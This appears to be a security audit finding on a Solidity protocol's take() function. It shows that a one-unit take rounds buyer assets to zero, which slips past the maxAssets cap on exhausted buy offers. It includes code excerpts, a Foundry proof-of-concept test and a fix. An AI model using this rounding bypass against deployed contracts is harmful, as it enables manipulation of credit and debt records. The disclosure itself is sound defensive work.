### Title
Zero-asset take bypasses fully-consumed cap on assets-based buy offers, triggering maker callback and mutating position state — (`src/Midnight.sol`)

### Summary
When a buy offer uses `maxAssets`-based consumption and `offerPrice < WAD`, a taker can call `take()` with a small `units` value (e.g., `units = 1`) such that `buyerAssets = units.mulDivDown(buyerPrice, WAD) == 0`. Because the consumed accounting adds `buyerAssets` (zero) to the already-exhausted `consumed[maker][group]`, the cap check `newConsumed <= maxAssets` passes even when the offer is fully consumed. The take then proceeds to completion: position credit/debt mutates, `totalUnits` increases, the maker's `onBuy` callback fires, and zero tokens are transferred — all on an offer that should be inert.

### Finding Description

**Code path** — `src/Midnight.sol`, `take()`:

```
Line 363: buyerAssets = units.mulDivDown(buyerPrice, WAD)
           → with units=1, buyerPrice<WAD: mulDivDown(1, buyerPrice, WAD) = 0

Line 367-369:
  if (offer.maxAssets > 0) {
      newConsumed = consumed[maker][group] += buyerAssets;   // += 0
      require(newConsumed <= offer.maxAssets, ConsumedAssets()); // maxAssets <= maxAssets ✓
  }
```

The guard at line 369 is the only check preventing execution on an exhausted offer. Because `buyerAssets` rounds to zero, `newConsumed` does not increase, and the require passes.

**Execution continues unconditionally:**

- Lines 382–384: `buyerCreditIncrease = zeroFloorSub(units, buyerPos.debt)` — if buyer has no debt, this equals `units = 1`. `sellerDebtIncrease = units - sellerCreditDecrease`.
- Lines 408–414: `buyerPos.credit += 1`, `sellerPos.debt += 1`.
- Lines 416–417: `totalUnits` increases by `buyerCreditIncrease`.
- Lines 445–453: `IBuyCallback(buyerCallback).onBuy(...)` is called with `buyerAssets=0, units=1` — the maker's callback fires on an exhausted offer.
- Lines 455–456: `safeTransferFrom(..., 0)` — zero tokens move, so no revert.

**Attacker-controlled inputs:**
- `offer.buy = true`, `offer.maxAssets > 0`, `offer.tick` set so `offerPrice < WAD` (e.g., `MAX_TICK - 16`)
- `consumed[maker][group]` already at `maxAssets` (self-set via `setConsumed`, or after a prior fill)
- `units = 1`

**Why existing checks fail:**
- The `ConsumedAssets` check (line 369) only compares `newConsumed` to `maxAssets`. Since `buyerAssets = 0`, `newConsumed` is unchanged and the check is trivially satisfied.
- There is no `require(units == 0 || buyerAssets > 0)` guard.
- The protocol comment at line 94 explicitly acknowledges this: *"It is possible to give units to a fully consumed assets-based buy offer with price < 1."*

**Confirmed by existing test** `testBugBuyMaxAssetsBypass()` in `test/TakeTest.sol` (lines 858–889), which is named "Bug", does not use `vm.expectRevert`, and asserts that after the take: `creditOf(lender) > before`, `debtOf(borrower) > before`, `totalUnits > before`, while `consumed` and token balances are unchanged.

### Impact Explanation

An unprivileged taker can, on any fully-consumed assets-based buy offer with `offerPrice < WAD`:

1. Invoke the maker's `onBuy` callback with `buyerAssets=0, units=1` — callback logic that assumes it is only called when real assets are exchanged may behave incorrectly or be exploited.
2. Grant the maker (buyer) free credit and impose free debt on the taker/seller with zero token cost — `totalUnits` and position accounting diverge from actual asset flows.
3. Repeat the call indefinitely (consumed never increases past `maxAssets`), amplifying the position mutation and callback invocations without bound.

### Likelihood Explanation

**Preconditions:**
- `offer.buy = true` and `offer.maxAssets > 0` (standard buy offer configuration).
- `offerPrice < WAD` — achievable at any tick below the WAD-price tick; the test uses `MAX_TICK - 16`.
- `consumed[maker][group] == maxAssets` — reachable after a normal full fill, or self-set by the maker via `setConsumed`.

All preconditions are reachable by an unprivileged taker with no special access. The attack is repeatable on every such exhausted offer and requires no capital (zero tokens transferred).

### Recommendation

Add an explicit guard that rejects a non-zero `units` input when it produces zero assets in assets-based mode:

```solidity
// In the maxAssets branch, after computing buyerAssets/sellerAssets:
if (offer.maxAssets > 0) {
    uint256 assetsDelta = offer.buy ? buyerAssets : sellerAssets;
    require(units == 0 || assetsDelta > 0, ZeroAssetTake());
    newConsumed = consumed[offer.maker][offer.group] += assetsDelta;
    require(newConsumed <= offer.maxAssets, ConsumedAssets());
}
```

This ensures that any non-trivial `units` input must produce at least one asset unit, preventing the rounding-to-zero bypass.

### Proof of Concept

The existing test `testBugBuyMaxAssetsBypass()` in `test/TakeTest.sol` is a complete Foundry unit test PoC:

```solidity
// test/TakeTest.sol lines 858-889
function testBugBuyMaxAssetsBypass() public {
    deal(address(loanToken), lender, 0);       // lender pays 0 tokens
    collateralize(market, borrower, 100);

    lenderOffer.maxUnits = 0;
    lenderOffer.maxAssets = 1;
    lenderOffer.tick = MAX_TICK - 16;          // offerPrice < WAD → buyerPrice < WAD

    // Fully consume the offer (consumed == maxAssets)
    vm.prank(lender);
    midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

    (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

    // Key assertions:
    assertEq(buyerAssets, 0);                  // zero assets exchanged
    assertEq(sellerAssets, 0);
    assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets); // cap unchanged
    // But state mutated:
    assertGt(midnight.creditOf(id, lender), lenderCreditBefore);   // free credit
    assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);   // free debt
    assertGt(midnight.totalUnits(id), totalUnitsBefore);           // totalUnits inflated
}
```

**Expected assertions for a fixed implementation:** `take(1, borrower, lenderOffer)` should revert (e.g., with `ZeroAssetTake` or `ConsumedAssets`), and all state variables should remain unchanged. [1](#0-0) [2](#0-1) [3](#0-2) [4](#0-3) [5](#0-4)

### Citations

**File:** src/Midnight.sol (L91-94)
```text
/// @dev maxAssets caps max buyer assets if offer.buy is true, and caps max seller assets otherwise.
/// @dev If maxAssets > 0, assets are capped to maxAssets, otherwise units are capped to maxUnits.
/// @dev Midnight can call the callback of offers through a no-op take, even if those offers have consumed==max.
/// @dev It is possible to give units to a fully consumed assets-based buy offer with price < 1.
```

**File:** src/Midnight.sol (L363-369)
```text
        uint256 buyerAssets = offer.buy ? units.mulDivDown(buyerPrice, WAD) : units.mulDivUp(buyerPrice, WAD);
        uint256 sellerAssets = offer.buy ? units.mulDivDown(sellerPrice, WAD) : units.mulDivUp(sellerPrice, WAD);

        uint256 newConsumed;
        if (offer.maxAssets > 0) {
            newConsumed = consumed[offer.maker][offer.group] += offer.buy ? buyerAssets : sellerAssets;
            require(newConsumed <= offer.maxAssets, ConsumedAssets());
```

**File:** src/Midnight.sol (L382-417)
```text
        uint256 buyerCreditIncrease = UtilsLib.zeroFloorSub(units, buyerPos.debt);
        uint256 sellerCreditDecrease = UtilsLib.min(units, sellerPos.credit);
        uint256 sellerDebtIncrease = units - sellerCreditDecrease;
        uint128 buyerPendingFeeIncrease =
            UtilsLib.toUint128(buyerCreditIncrease.mulDivDown(_marketState.continuousFee * timeToMaturity, WAD));
        uint128 sellerPendingFeeDecrease = sellerPos.credit > 0
            ? UtilsLib.toUint128(sellerPos.pendingFee.mulDivUp(sellerCreditDecrease, sellerPos.credit))
            : 0;

        require(block.timestamp <= offer.market.maturity || sellerDebtIncrease == 0, CannotIncreaseDebtPostMaturity());
        require(
            !offer.reduceOnly || (offer.buy ? buyerCreditIncrease == 0 : sellerDebtIncrease == 0),
            MakerCreditOrDebtIncreased()
        );

        require(
            offer.market.enterGate == address(0) || buyerCreditIncrease == 0
                || IEnterGate(offer.market.enterGate).canIncreaseCredit(buyer),
            BuyerGatedFromIncreasingCredit()
        );
        require(
            offer.market.enterGate == address(0) || sellerDebtIncrease == 0
                || IEnterGate(offer.market.enterGate).canIncreaseDebt(seller),
            SellerGatedFromIncreasingDebt()
        );

        buyerPos.debt -= UtilsLib.toUint128(units - buyerCreditIncrease);
        buyerPos.pendingFee += buyerPendingFeeIncrease;
        buyerPos.credit += UtilsLib.toUint128(buyerCreditIncrease);

        sellerPos.pendingFee -= sellerPendingFeeDecrease;
        sellerPos.credit -= UtilsLib.toUint128(sellerCreditDecrease);
        sellerPos.debt += UtilsLib.toUint128(sellerDebtIncrease);

        _marketState.totalUnits =
            UtilsLib.toUint128(_marketState.totalUnits + buyerCreditIncrease - sellerCreditDecrease);
```

**File:** src/Midnight.sol (L445-453)
```text
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }
```

**File:** test/TakeTest.sol (L858-889)
```text
    function testBugBuyMaxAssetsBypass() public {
        deal(address(loanToken), lender, 0); // lender pays 0
        collateralize(market, borrower, 100);

        lenderOffer.maxUnits = 0;
        lenderOffer.maxAssets = 1;
        lenderOffer.tick = MAX_TICK - 16; // offerPrice < WAD

        // Fully consume the offer before the take.
        vm.prank(lender);
        midnight.setConsumed(lenderOffer.group, lenderOffer.maxAssets, lender);

        uint256 lenderCreditBefore = midnight.creditOf(id, lender);
        uint256 borrowerDebtBefore = midnight.debtOf(id, borrower);
        uint256 totalUnitsBefore = midnight.totalUnits(id);
        uint256 lenderBalBefore = loanToken.balanceOf(lender);
        uint256 borrowerBalBefore = loanToken.balanceOf(borrower);

        (uint256 buyerAssets, uint256 sellerAssets) = take(1, borrower, lenderOffer);

        assertEq(buyerAssets, 0);
        assertEq(sellerAssets, 0);

        // Nothing observable to the cap or token balances changed:
        assertEq(midnight.consumed(lender, lenderOffer.group), lenderOffer.maxAssets);
        assertEq(loanToken.balanceOf(lender), lenderBalBefore);
        assertEq(loanToken.balanceOf(borrower), borrowerBalBefore);
        // But position state strictly changed:
        assertGt(midnight.creditOf(id, lender), lenderCreditBefore);
        assertGt(midnight.debtOf(id, borrower), borrowerDebtBefore);
        assertGt(midnight.totalUnits(id), totalUnitsBefore);
    }
```
